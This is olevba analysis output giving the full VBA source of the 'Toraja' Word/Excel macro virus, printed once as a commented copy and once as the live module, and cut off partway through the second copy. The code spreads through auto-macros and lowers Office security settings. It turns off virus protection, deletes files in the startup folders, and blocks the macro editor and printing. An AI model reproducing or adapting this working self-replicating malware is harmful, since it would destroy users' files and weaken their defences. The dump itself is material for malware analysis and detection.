olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Toraja.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Toraja.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Rem Created       : Toraja High Land 1998
'Rem Modified      : July 1999
'Rem --------------------------------------------------------------
'Option Explicit
'Option Compare Text
'Dim Komp As Variant, ctl
'Public Const regApp As String = "Application": Public Const regSecSet As String = "Settings": Public Const TempName As String = "Tana": Public Const MacName As String = "Toraja"
'Public Const fStartUp As String = "AutoStart": Public Const Ver As String = "01": Dim CusProp, actWindow
'Global Active, Temp, tempPath, AllActive, blnFound As Boolean, blnXls As Boolean, blnMod As Boolean
'Sub Register()
'On Error Resume Next
'If GetSetting(regApp, regSecSet, "FirstRun") = "" Then SaveSetting regApp, regSecSet, "FirstRun", Format(Date + 30, "dd-mm-yyyy")
'If GetSetting(regApp, regSecSet, "UserKeyWord") <> Ver & MacName Then SaveSetting regApp, regSecSet, "UserKeyWord", ""
'If GetSetting(regApp, regSecSet, "AuthorKeyWord") <> "Marsel" Then SaveSetting regApp, regSecSet, "AuthorKeyWord", ""
'End Sub
'Function Serang() As Boolean
'Dim getDate As Date
'On Error Resume Next
'getDate = GetSetting(regApp, regSecSet, "FirstRun")
'If Format(getDate, "dd-mm-yyyy") <= Format(Date, "dd-mm-yyyy") Then MsgBox "This command not available now.", 48
'End Function
'Sub AutoExec()
'On Error Resume Next
'Application.EnableCancelKey = 0
'RemStartUp Application.StartupPath & Application.PathSeparator
'If MacroContainer <> fStartUp & Ver & ".dot" Then
'    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 3
'    Application.DisplayRecentFiles = False
'    MenuWord
'    Register
'Else
'    KompProject fStartUp & Ver & ".dot", NormalTemplate, False
'    If blnMod = False Then
'        Application.OrganizerCopy Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dat", NormalTemplate.FullName, MacName & Ver, 3
'        NormalTemplate.Save
'    End If
'    WordBasic.DisableAutoMacros 1
'    AddIns.Unload False
'    WordBasic.DisableAutoMacros 0
'    TempActive
'End If
'End Sub
'Sub AutoNew()
'On Error Resume Next
'TempActive
'ActiveWindow.View.Type = 3
'End Sub
'Function RemStartUp(fPath) As Boolean
'On Error GoTo Salah
'blnXls = False: blnFound = False: blnMod = False
'If Dir(fPath, 16) <> "" Then
'  Komp = Dir(fPath, 0 Or 1 Or 2)
'  Do While Komp <> ""
'    If Komp = fStartUp & Ver & ".dot" Then blnMod = True: SetAttr fPath & Komp, 1
'    If Komp = fStartUp & Ver & ".dat" Then blnFound = True: SetAttr fPath & Komp, 1 + 2
'    If Komp = fStartUp & Ver & ".XLS" Then blnXls = True: SetAttr fPath & Komp, 1
'    If Komp <> "." And Komp <> ".." And Komp <> fStartUp & Ver & ".dot" And Komp <> fStartUp & Ver & ".dat" And _
'       Komp <> "MSCREATE.DIR" And Left(Komp, 2) <> "~$" And Komp <> fStartUp & Ver & ".XLS" Then _
'       SetAttr fPath & Komp, vbNormal: Kill fPath & Komp
'      Komp = Dir
'  Loop
'  If blnMod = True And blnFound = True Then RemStartUp = True
'End If
'Exit Function
'Salah:
'Resume Next
'End Function
'Sub AutoOpen()
'On Error Resume Next
'Dim strRun As String
'ActiveTemp
'RemoveAll
'MenuWord
'Register
'If blnFound = True Then
'   strRun = TempName & Ver & "." & MacName & Ver & ".FoundIt"
'   Application.OnTime Now + TimeValue("00:01:00"), strRun
'End If
'End Sub
'Sub AutoExit()
'On Error Resume Next
'Application.Visible = False
'Application.DisplayAlerts = 0
'If MacroContainer = "Normal.dot" Then
'    ExportXls
'    If RemStartUp(Application.StartupPath & Application.PathSeparator) = False Then
'        Documents.Add
'        ActiveDocument.SaveAs Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dat", 0
'        ActiveDocument.SaveAs Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dot", 1
'    End If
'End If
'End Sub
'Function KeyWord() As Boolean
'If GetSetting(regApp, regSecSet, "UserKeyWord") = Ver & MacName Then KeyWord = True
'End Function
'Sub FileOpen()
'On Error Resume Next
'WordBasic.DisableAutoMacros 1
'Dialogs(80).Show
'TempActive
'WordBasic.DisableAutoMacros 0
'End Sub
'Function KompProject(Asal, Tujuan, blnEIKMod As Boolean) As Boolean
'On Error GoTo Salah
'blnMod = False
'For Each Komp In Tujuan.VBProject.VBComponents
'   If (Komp.Name <> "ThisDocument") And (Komp.Name <> "Reference To Normal") And _
'      (Left(Komp.Name, 5) <> "Sheet") And (Komp.Name <> "ThisWorkbook") And (Left(Komp.Name, 5) <> "Chart") Then
'        If Komp.Name = MacName & Ver Then If Tujuan.VBProject.VBComponents(MacName & Ver).CodeModule.CountOfLines = _
'           Asal.VBProject.VBComponents(MacName & Ver).CodeModule.CountOfLines Then _
'            blnMod = True Else GoSub RemoveKomp Else GoSub RemoveKomp
'   End If
'Next Komp
'If blnEIKMod = True Then If blnMod = False Then If EIKModul(Asal, Tujuan, MacName & Ver) = True Then KompProject = True
'Salah:
'Exit Function
'RemoveKomp:
'Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(Komp.Name): KompProject = True: Return
'End Function
'Sub ThisDocNT()
'Dim VBCompNT
'On Error Resume Next
'Set VBCompNT = NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
'If VBCompNT.CountOfLines > 0 Then VBCompNT.DeleteLines 1, VBCompNT.CountOfLines
'End Sub
'Function RemoveAll() As Boolean
'On Error GoTo Salah
'Aplikasi
'For Each actWindow In AllActive
'    If actWindow.Name = fStartUp & Ver & ".XLS" Then RemoveAll = True
'    If actWindow.Name <> Active.Name Then
'        If KompProject(Active, actWindow, True) = True Then If Len(actWindow.Path) <> 0 Then actWindow.Save
'    End If
'Next actWindow
'Salah:
'End Function
'Function PrintOke() As Boolean
'Const CP = "cPrt"
'On Error GoTo Salah
'If KeyWord = True Or GetCreator = True Then
'    PrintOke = True
'Else
'    If CusProp.Item(CP).Value < 2 Then
'        CusProp.Item(CP).Value = CusProp.Item(CP).Value + 1
'        If Val(GetSetting(regApp, regSecSet, CP)) <= 15 Then SaveSetting regApp, regSecSet, CP, Val(GetSetting(regApp, regSecSet, CP)) + 1: PrintOke = True
'    End If
'End If
'Salah:
'End Function
'Sub FilePrint()
'On Error Resume Next
'If PrintOke = True Then Dialogs(88).Show Else If Dialogs(88).Display = -1 Then Serang
'End Sub
'Sub FilePrintDefault()
'FilePrint
'End Sub
'Sub ToolsCustomizeKeyboard()
'Serang
'End Sub
'Sub ViewCode()
'Serang
'End Sub
'Sub ViewVbCode()
'If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Mrs" Then Application.ShowVisualBasicEditor = True Else Serang
'End Sub
'Sub ToolsCustomize()
'Serang
'End Sub
'Sub FormatStyle()
'If KeyWord = True Then Dialogs(180).Show Else Serang
'End Sub
'Sub ToolsRecordMacroToggle()
'Serang
'End Sub
'Sub ToolsMacro()
'Serang
'End Sub
'Sub FileTemplates()
'Serang
'End Sub
'Private Sub ExportXls()
'Dim xlsApp
'Dim strFile As String
'On Error Resume Next
'Set xlsApp = GetObject(, "Excel.Application")
'If xlsApp Is Nothing Then
'    Set xlsApp = CreateObject("Excel.Application")
'    If Not xlsApp Is Nothing Then GoSub CheckXls:   xlsApp.Application.Quit
'Else
'    GoSub CheckXls
'End If
'Exit Sub
'CheckXls:
'     RemStartUp xlsApp.StartupPath & xlsApp.PathSeparator
'    If blnXls = False Then
'        xlsApp.Workbooks.Add
'        strFile = xlsApp.StartupPath & xlsApp.PathSeparator & fStartUp & Ver & ".XLS"
'        xlsApp.ActiveWorkbook.SaveAs strFile
'        tempPath = Application.NormalTemplate.Path & Application.PathSeparator
'        EIKModul NormalTemplate, xlsApp.Workbooks(fStartUp & Ver & ".XLS"), MacName & Ver
'        xlsApp.Workbooks(fStartUp & Ver & ".XLS").VBProject.Name = TempName & Ver
'        xlsApp.ActiveWindow.Visible = False
'        xlsApp.Workbooks(fStartUp & Ver & ".XLS").Save
'    End If
'Return
'End Sub
'Sub ExportDok()
'Dim dokApp
'On Error Resume Next
'Set dokApp = GetObject(, "Word.Application")
'If dokApp Is Nothing Then
'    Set dokApp = CreateObject("Word.Application")
'    If Not dokApp Is Nothing Then GoSub CheckDoc: dokApp.Application.Quit True
'Else
'    GoSub CheckDoc
'End If
'Exit Sub
'CheckDoc:
'tempPath = Application.TemplatesPath
'KompProject Workbooks(fStartUp & Ver & ".XLS"), dokApp.NormalTemplate, True
'RemStartUp dokApp.StartupPath & dokApp.PathSeparator
'Return
'End Sub
'Sub Auto_Open()
'On Error Resume Next
'Application.EnableCancelKey = 0
'If RemoveAll = False Then BuatXlsActive
'RemStartUp Application.StartupPath & Application.PathSeparator
'XlsActive
'If ActiveWorkbook.Name = fStartUp & Ver & ".XLS" Then ExportDok
'Register
'Application.DisplayRecentFiles = False
'End Sub
'Sub XlsActive()
'On Error Resume Next
'Application.DisplayAlerts = False
'CreateEvents
'TempActive
'Application.OnSheetActivate = "": Application.OnSheetDeactivate = "": Application.OnWindow = ""
'MenuExcel
'Application.OnWindow = fStartUp & Ver & ".XLS" & "!XlsActive"
'Application.DisplayAlerts = True
'End Sub
'Sub TempActive()
'On Error Resume Next
'Aplikasi
'If KompProject(Temp, Active, True) = True Then
'   SetCusProp
'   Active.VBProject.Name = MacName
'   If Len(Active.Path) <> 0 Then Active.Save
'End If
'End Sub
'Function EIKModul(Asal, Tujuan, Komp As String) As Boolean
'On Error GoTo Salah
'    Asal.VBProject.VBComponents(Komp).Export tempPath & Komp
'    Tujuan.VBProject.VBComponents.Import tempPath & Komp
'    EIKModul = True: Kill tempPath & Komp
'Salah:
'End Function
'Sub OpenFile()
'On Error Resume Next
'Application.DisplayAlerts = False
'Application.Dialogs(1).Show
'XlsActive
'End Sub
'Private Sub CreateEvents()
'Dim VBComp
'On Error GoTo Salah
'Lanjut:
'If ActiveWorkbook.CustomDocumentProperties.Item("Event").Value <> MacName & Ver And ActiveWorkbook.Name <> fStartUp & Ver & ".XLS" Then
'On Error GoTo FatalError
'    Set VBComp = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
'    With VBComp
'            .DeleteLines 1, .CountOfLines: .InsertLines 1, "Private Sub Workbook_BeforePrint(Cancel As Boolean)"
'            .InsertLines 2, "On Error Resume Next": .InsertLines 3, "If PrintOke = False Then Cancel = True": .InsertLines 4, "End Sub"
'    End With
'ActiveWorkbook.CustomDocumentProperties.Item("Event").Value = MacName & Ver
'End If
'FatalError:
'Exit Sub
'Salah:
'ActiveWorkbook.CustomDocumentProperties.Add ("Event"), False, 4, ""
'Resume Lanjut
'End Sub
'Sub BuatXlsActive()
'Dim Baru As String
'On Error Resume Next
'Application.ScreenUpdating = False
'Workbooks.Add
'Baru = Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".XLS"
'ActiveWorkbook.SaveAs Baru
'ActiveWindow.Visible = False
'ActiveTemp
'End Sub
'Sub ActiveTemp()
'On Error Resume Next
'Aplikasi
'If KompProject(Active, Temp, True) = True Then
'   Temp.VBProject.Name = TempName & Ver
'   Temp.Save
'   blnFound = True
'End If
'End Sub
'Sub MenuExcel()
'On Error Resume Next
'WordExcel
'CommandBars("Ply").Controls("View Code").Delete
'With Application
'    .OnKey "%{F11}", "Serang": .OnKey "%{F8}", "Serang": .OnKey "%{F2}", "Serang"
'    .OnKey "%{F4}", "Serang": .OnKey "{F12}", "Serang": .OnKey "^{o}", "OpenFile"
'End With
'CommandBars("Standard").Controls("Open").OnAction = "OpenFile"
'CommandBars("Worksheet Menu Bar").Controls("File").Controls("Open...").OnAction = "OpenFile"
'CommandBars("Worksheet Menu Bar").Controls("Window").Controls("Unhide...").Enabled = False
'End Sub
'Sub WordExcel()
'On Error Resume Next
'For Each ctl In CommandBars.ActiveMenuBar.Controls("Tools").Controls("Macro").Controls
'    ctl.OnAction = "Serang"
'Next ctl
'cmdBars CommandBars("Control Toolbox"), True: cmdBars CommandBars("Forms"), True: cmdBars CommandBars("ActiveX Control"), True
'cmdBars CommandBars("Visual Basic"), True: cmdBars CommandBars.ActiveMenuBar, False: cmdBars CommandBars("Formatting"), False
'cmdBars CommandBars("Standard"), False
'End Sub
'Sub cmdBars(cmd, blnVis As Boolean)
'With cmd
'If blnVis = True Then .Enabled = False: .Visible = False: .Protection = 8
'    .Protection = 1
'End With
'End Sub
'Sub MenuWord()
'On Error Resume Next
'CustomizationContext = NormalTemplate
'With Options
'    .VirusProtection = False: .SaveNormalPrompt = False: .SaveInterval = 0
'End With
'FindKey(BuildKeyCode(1024, 119)).Disable: FindKey(BuildKeyCode(1024, 112)).Disable
'WordExcel
'End Sub
'Sub SetCusProp()
'On Error Resume Next
'Set CusProp = Active.CustomDocumentProperties
'CusProp.Add "Author", False, 4, "": CusProp.Add "cPrt", False, 1, 0
'If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Marsel" Then CusProp.Item("Author").Value = "Lina"
'End Sub
'Function GetCreator() As Boolean
'On Error GoTo Salah
'Aplikasi
'Set CusProp = Active.CustomDocumentProperties
'If CusProp.Item("Author").Value = "Lina" Then GetCreator = True
'Salah:
'End Function
'Sub FoundIt()
'TempActive
'blnFound = False
'End Sub
'Function Tator() As Boolean
'If (KeyWord = False) And (GetCreator = False) Then Tator = True
'End Function
'Sub Aplikasi()
'If Application.Name = "Microsoft Word" Then Doc Else Xls
'End Sub
'Sub Doc()
'ThisDocNT
'CreateThisDocAD
'tempPath = Application.NormalTemplate.Path & Application.PathSeparator: Set Active = ActiveDocument: Set Temp = NormalTemplate: Set AllActive = Documents
'End Sub
'Sub Xls()
'Set Active = ActiveWorkbook: Set Temp = Workbooks(fStartUp & Ver & ".XLS"): tempPath = Application.TemplatesPath: Set AllActive = Workbooks
'End Sub
'Sub CreateThisDocAD()
'On Error GoTo Salah
'Dim i, VBCompNT, VBCompAD
'Dim sLine As String
'Set VBCompNT = NormalTemplate.VBProject.VBComponents(MacName & Ver).CodeModule
'Set VBCompAD = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule
'If VBCompNT.CountOfLines <> VBCompAD.CountOfLines - 1 Then
'    VBCompAD.DeleteLines 1, VBCompAD.CountOfLines
'    For i = 1 To VBCompNT.CountOfLines
'         sLine = VBCompNT.Lines(i, 1)
'        If Left(sLine, 1) = "'" Then VBCompAD.InsertLines i, Right(sLine, Len(sLine) - 1) Else VBCompAD.InsertLines i, "'" & sLine
'    Next i
'End If
'Salah:
'End Sub
Function CheckComp(Tujuan)
Dim i, x, VBComp
Dim sLine As String: Dim blnM As Boolean
Const mName = "Toraja01"
blnM = False
For Each VBComp In Tujuan.VBProject.VBComponents
   If VBComp.Name <> "ThisDocument" And VBComp.Name <> "Reference To Normal" Then
        If VBComp.Name = mName Then If Tujuan.VBProject.VBComponents(mName).CodeModule.CountOfLines = _
           ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines - 1 Then _
            blnM = True Else GoSub RemoveKomp Else GoSub RemoveKomp
   End If
Next VBComp
If blnM = False Then
x = Tujuan.VBProject.VBComponents.Count
Tujuan.VBProject.VBComponents.Add 1
Tujuan.VBProject.VBComponents(x + 1).Name = mName
Set VBComp = Tujuan.VBProject.VBComponents(mName).CodeModule
For i = 1 To ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
     sLine = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.Lines(i, 1)
     If Left(sLine, 1) = "'" Then VBComp.InsertLines i, Right(sLine, Len(sLine) - 1) Else VBComp.InsertLines i, "'" & sLine
Next i
If Len(Tujuan.Path) <> 0 Then Tujuan.Save
End If
Salah:
Exit Function
RemoveKomp:
Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(VBComp.Name): Return
End Function
Sub AutoClose()
On Error Resume Next
CheckComp NormalTemplate
CheckComp ActiveDocument
Application.Run "RemoveAll"
End Sub

'

'

-------------------------------------------------------------------------------
VBA MACRO Toraja01.bas 
in file: Virus.MSOffice.Toraja.b - OLE stream: 'Macros/VBA/Toraja01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem Created       : Toraja High Land 1998
Rem Modified      : July 1999
Rem --------------------------------------------------------------
Option Explicit
Option Compare Text
Dim Komp As Variant, ctl
Public Const regApp As String = "Application": Public Const regSecSet As String = "Settings": Public Const TempName As String = "Tana": Public Const MacName As String = "Toraja"
Public Const fStartUp As String = "AutoStart": Public Const Ver As String = "01": Dim CusProp, actWindow
Global Active, Temp, tempPath, AllActive, blnFound As Boolean, blnXls As Boolean, blnMod As Boolean
Sub Register()
On Error Resume Next
If GetSetting(regApp, regSecSet, "FirstRun") = "" Then SaveSetting regApp, regSecSet, "FirstRun", Format(Date + 30, "dd-mm-yyyy")
If GetSetting(regApp, regSecSet, "UserKeyWord") <> Ver & MacName Then SaveSetting regApp, regSecSet, "UserKeyWord", ""
If GetSetting(regApp, regSecSet, "AuthorKeyWord") <> "Marsel" Then SaveSetting regApp, regSecSet, "AuthorKeyWord", ""
End Sub
Function Serang() As Boolean
Dim getDate As Date
On Error Resume Next
getDate = GetSetting(regApp, regSecSet, "FirstRun")
If Format(getDate, "dd-mm-yyyy") <= Format(Date, "dd-mm-yyyy") Then MsgBox "This command not available now.", 48
End Function
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = 0
RemStartUp Application.StartupPath & Application.PathSeparator
If MacroContainer <> fStartUp & Ver & ".dot" Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 3
    Application.DisplayRecentFiles = False
    MenuWord
    Register
Else
    KompProject fStartUp & Ver & ".dot", NormalTemplate, False
    If blnMod = False Then
        Application.OrganizerCopy Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dat", NormalTemplate.FullName, MacName & Ver, 3
        NormalTemplate.Save
    End If
    WordBasic.DisableAutoMacros 1
    AddIns.Unload False
    WordBasic.DisableAutoMacros 0
    TempActive
End If
End Sub
Sub AutoNew()
On Error Resume Next
TempActive
ActiveWindow.View.Type = 3
End Sub
Function RemStartUp(fPath) As Boolean
On Error GoTo Salah
blnXls = False: blnFound = False: blnMod = False
If Dir(fPath, 16) <> "" Then
  Komp = Dir(fPath, 0 Or 1 Or 2)
  Do While Komp <> ""
    If Komp = fStartUp & Ver & ".dot" Then blnMod = True: SetAttr fPath & Komp, 1
    If Komp = fStartUp & Ver & ".dat" Then blnFound = True: SetAttr fPath & Komp, 1 + 2
    If Komp = fStartUp & Ver & ".XLS" Then blnXls = True: SetAttr fPath & Komp, 1
    If Komp <> "." And Komp <> ".." And Komp <> fStartUp & Ver & ".dot" And Komp <> fStartUp & Ver & ".dat" And _
       Komp <> "MSCREATE.DIR" And Left(Komp, 2) <> "~$" And Komp <> fStartUp & Ver & ".XLS" Then _
       SetAttr fPath & Komp, vbNormal: Kill fPath & Komp
      Komp = Dir
  Loop
  If blnMod = True And blnFound = True Then RemStartUp = True
End If
Exit Function
Salah:
Resume Next
End Function
Sub AutoOpen()
On Error Resume Next
Dim strRun As String
ActiveTemp
RemoveAll
MenuWord
Register
If blnFound = True Then
   strRun = TempName & Ver & "." & MacName & Ver & ".FoundIt"
   Application.OnTime Now + TimeValue("00:01:00"), strRun
End If
End Sub
Sub AutoExit()
On Error Resume Next
Application.Visible = False
Application.DisplayAlerts = 0
If MacroContainer = "Normal.dot" Then
    ExportXls
    If RemStartUp(Application.StartupPath & Application.PathSeparator) = False Then
        Documents.Add
        ActiveDocument.SaveAs Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dat", 0
        ActiveDocument.SaveAs Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dot", 1
    End If
End If
End Sub
Function KeyWord() As Boolean
If GetSetting(regApp, regSecSet, "UserKeyWord") = Ver & MacName Then KeyWord = True
End Function
Sub FileOpen()
On Error Resume Next
WordBasic.DisableAutoMacros 1
Dialogs(80).Show
TempActive
WordBasic.DisableAutoMacros 0
End Sub
Function KompProject(Asal, Tujuan, blnEIKMod As Boolean) As Boolean
On Error GoTo Salah
blnMod = False
For Each Komp In Tujuan.VBProject.VBComponents
   If (Komp.Name <> "ThisDocument") And (Komp.Name <> "Reference To Normal") And _
      (Left(Komp.Name, 5) <> "Sheet") And (Komp.Name <> "ThisWorkbook") And (Left(Komp.Name, 5) <> "Chart") Then
        If Komp.Name = MacName & Ver Then If Tujuan.VBProject.VBComponents(MacName & Ver).CodeModule.CountOfLines = _
           Asal.VBProject.VBComponents(MacName & Ver).CodeModule.CountOfLines Then _
            blnMod = True Else GoSub RemoveKomp Else GoSub RemoveKomp
   End If
Next Komp
If blnEIKMod = True Then If blnMod = False Then If EIKModul(Asal, Tujuan, MacName & Ver) = True Then KompProject = True
Salah:
Exit Function
RemoveKomp:
Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(Komp.Name): KompProject = True: Return
End Function
Sub ThisDocNT()
Dim VBCompNT
On Error Resume Next
Set VBCompNT = NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If VBCompNT.CountOfLines > 0 Then VBCompNT.DeleteLines 1, VBCompNT.CountOfLines
End Sub
Function RemoveAll() As Boolean
On Error GoTo Salah
Aplikasi
For Each actWindow In AllActive
    If actWindow.Name = fStartUp & Ver & ".XLS" Then RemoveAll = True
    If actWindow.Name <> Active.Name Then
        If KompProject(Active, actWindow, True) = True Then If Len(actWindow.Path) <> 0 Then actWindow.Save
    End If
Next actWindow
Salah:
End Function
Function PrintOke() As Boolean
Const CP = "cPrt"
On Error GoTo Salah
If KeyWord = True Or GetCreator = True Then
    PrintOke = True
Else
    If CusProp.Item(CP).Value < 2 Then
        CusProp.Item(CP).Value = CusProp.Item(CP).Value + 1
        If Val(GetSetting(regApp, regSecSet, CP)) <= 15 Then SaveSetting regApp, regSecSet, CP, Val(GetSetting(regApp, regSecSet, CP)) + 1: PrintOke = True
    End If
End If
Salah:
End Function
Sub FilePrint()
On Error Resume Next
If PrintOke = True Then Dialogs(88).Show Else If Dialogs(88).Display = -1 Then Serang
End Sub
Sub FilePrintDefault()
FilePrint
End Sub
Sub ToolsCustomizeKeyboard()
Serang
End Sub
Sub ViewCode()
Serang
End Sub
Sub ViewVbCode()
If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Mrs" Then Application.ShowVisualBasicEditor = True Else Serang
End Sub
Sub ToolsCustomize()
Serang
End Sub
Sub FormatStyle()
If KeyWord = True Then Dialogs(180).Show Else Serang
End Sub
Sub ToolsRecordMacroToggle()
Serang
End Sub
Sub ToolsMacro()
Serang
End Sub
Sub FileTemplates()
Serang
End Sub
Private Sub ExportXls()
Dim xlsApp
Dim strFile As String
On Error Resume Next
Set xlsApp = GetObject(, "Excel.Application")
If xlsApp Is Nothing Then
    Set xlsApp = CreateObject("Excel.Application")
    If Not xlsApp Is Nothing Then GoSub CheckXls:   xlsApp.Application.Quit
Else
    GoSub CheckXls
End If
Exit Sub
CheckXls:
     RemStartUp xlsApp.StartupPath & xlsApp.PathSeparator
    If blnXls = False Then
        xlsApp.Workbooks.Add
        strFile = xlsApp.StartupPath & xlsApp.PathSeparator & fStartUp & Ver & ".XLS"
        xlsApp.ActiveWorkbook.SaveAs strFile
        tempPath = Application.NormalTemplate.Path & Application.PathSeparator
        EIKModul NormalTemplate, xlsApp.Workbooks(fStartUp & Ver & ".XLS"), MacName & Ver
        xlsApp.Workbooks(fStartUp & Ver & ".XLS").VBProject.Name = TempName & Ver
        xlsApp.ActiveWindow.Visible = False
        xlsApp.Workbooks(fStartUp & Ver & ".XLS").Save
    End If
Return
End Sub
Sub ExportDok()
Dim dokApp
On Error Resume Next
Set dokApp = GetObject(, "Word.Application")
If dokApp Is Nothing Then
    Set dokApp = CreateObject("Word.Application")
    If Not dokApp Is Nothing Then GoSub CheckDoc: dokApp.Application.Quit True
Else
    GoSub CheckDoc
End If
Exit Sub
CheckDoc:
tempPath = Application.TemplatesPath
KompProject Workbooks(fStartUp & Ver & ".XLS"), dokApp.NormalTemplate, True
RemStartUp dokApp.StartupPath & dokApp.PathSeparator
Return
End Sub
Sub Auto_Open()
On Error Resume Next
Application.EnableCancelKey = 0
If RemoveAll = False Then BuatXlsActive
RemStartUp Application.StartupPath & Application.PathSeparator
XlsActive
If ActiveWorkbook.Name = fStartUp & Ver & ".XLS" Then ExportDok
Register
Application.DisplayRecentFiles = False
End Sub
Sub XlsActive()
On Error Resume Next
Application.DisplayAlerts = False
CreateEvents
TempActive
Application.OnSheetActivate = "": Application.OnSheetDeactivate = "": Application.OnWindow = ""
MenuExcel
Application.OnWindow = fStartUp & Ver & ".XLS" & "!XlsActive"
Application.DisplayAlerts = True
End Sub
Sub TempActive()
On Error Resume Next
Aplikasi
If KompProject(Temp, Active, True) = True Then
   SetCusProp
   Active.VBProject.Name = MacName
   If Len(Active.Path) <> 0 Then Active.Save
End If
End Sub
Function EIKModul(Asal, Tujuan, Komp As String) As Boolean
On Error GoTo Salah
    Asal.VBProject.VBComponents(Komp).Export tempPath & Komp
    Tujuan.VBProject.VBComponents.Import tempPath & Komp
    EIKModul = True: Kill tempPath & Komp
Salah:
End Function
Sub OpenFile()
On Error Resume Next
Application.DisplayAlerts = False
Application.Dialogs(1).Show
XlsActive
End Sub
Private Sub CreateEvents()
Dim VBComp
On Error GoTo Salah
Lanjut:
If ActiveWorkbook.CustomDocumentProperties.Item("Event").Value <> MacName & Ver And ActiveWorkbook.Name <> fStartUp & Ver & ".XLS" Then
On Error GoTo FatalError
    Set VBComp = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    With VBComp
            .DeleteLines 1, .CountOfLines: .InsertLines 1, "Private Sub Workbook_BeforePrint(Cancel As Boolean)"
            .InsertLines 2, "On Error Resume Next": .InsertLines 3, "If PrintOke = False Then Cancel = True": .InsertLines 4, "End Sub"
    End With
ActiveWorkbook.CustomDocumentProperties.Item("Event").Value = MacName & Ver
End If
FatalError:
Exit Sub
Salah:
ActiveWorkbook.CustomDocumentProperties.Add ("Event"), False, 4, ""
Resume Lanjut
End Sub
Sub BuatXlsActive()
Dim Baru As String
On Error Resume Next
Application.ScreenUpdating = False
Workbooks.Add
Baru = Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".XLS"
ActiveWorkbook.SaveAs Baru
ActiveWindow.Visible = False
ActiveTemp
End Sub
Sub ActiveTemp()
On Error Resume Next
Aplikasi
If KompProject(Active, Temp, True) = True Then
   Temp.VBProject.Name = TempName & Ver
   Temp.Save
   blnFound = True
End If
End Sub
Sub MenuExcel()
On Error Resume Next
WordExcel
CommandBars("Ply").Controls("View Code").Delete
With Application
    .OnKey "%{F11}", "Serang": .OnKey "%{F8}", "Serang": .OnKey "%{F2}", "Serang"
    .OnKey "%{F4}", "Serang": .OnKey "{F12}", "Serang": .OnKey "^{o}", "OpenFile"
End With
CommandBars("Standard").Controls("Open").OnAction = "OpenFile"
CommandBars("Worksheet Menu Bar").Controls("File").Controls("Open...").OnAction = "OpenFile"
CommandBars("Worksheet Menu Bar").Controls("Window").Controls("Unhide...").Enabled = False
End Sub
Sub WordExcel()
On Error Resume Next
For Each ctl In CommandBars.ActiveMenuBar.Controls("Tools").Controls("Macro").Controls
    ctl.OnAction = "Serang"
Next ctl
cmdBars CommandBars("Control Toolbox"), True: cmdBars CommandBars("Forms"), True: cmdBars CommandBars("ActiveX Control"), True
cmdBars CommandBars("Visual Basic"), True: cmdBars CommandBars.ActiveMenuBar, False: cmdBars CommandBars("Formatting"), False
cmdBars CommandBars("Standard"), False
End Sub
Sub cmdBars(cmd, blnVis As Boolean)
With cmd
If blnVis = True Then .Enabled = False: .Visible = False: .Protection = 8
    .Protection = 1
End With
End Sub
Sub MenuWord()
On Error Resume Next
CustomizationContext = NormalTemplate
With Options
    .VirusProtection = False: .SaveNormalPrompt = False: .SaveInterval = 0
End With
FindKey(BuildKeyCode(1024, 119)).Disable: FindKey(BuildKeyCode(1024, 112)).Disable
WordExcel
End Sub
Sub SetCusProp()
On Error Resume Next
Set CusProp = Active.CustomDocumentProperties
CusProp.Add "Author", False, 4, "": CusProp.Add "cPrt", False, 1, 0
If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Marsel" Then CusProp.Item("Author").Value = "Lina"
End Sub
Function GetCreator() As Boolean
On Error GoTo Salah
Aplikasi
Set CusProp = Active.CustomDocumentProperties
If CusProp.Item("Author").Value = "Lina" Then GetCreator = True
Salah:
End Function
Sub FoundIt()
TempActive
blnFound = False
End Sub
Function Tator() As Boolean
If (KeyWord = False) And (GetCreator = False) Then Tator = True
End Function
Sub Aplikasi()
If Application.Name = "Microsoft Word" Then Doc Else Xls
End Sub
Sub Doc()
ThisDocNT
CreateThisDocAD
tempPath = Application.NormalTemplate.Path & Application.PathSeparator: Set Active = ActiveDocument: Set Temp = NormalTemplate: Set AllActive = Documents
End Sub
Sub Xls()
Set Active = ActiveWorkbook: Set Temp = Workbooks(fStartUp & Ver & ".XLS"): tempPath = Application.TemplatesPath: Set AllActive = Workbooks
End Sub
Sub CreateThisDocAD()
On Error GoTo Salah
Dim i, VBCompNT, VBCompAD
Dim sLine As String
Set VBCompNT = NormalTemplate.VBProject.VBComponents(MacName & Ver).CodeModule
Set VBCompAD = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule
If VBCompNT.CountOfLines <> VBCompAD.CountOfLines - 1 Then
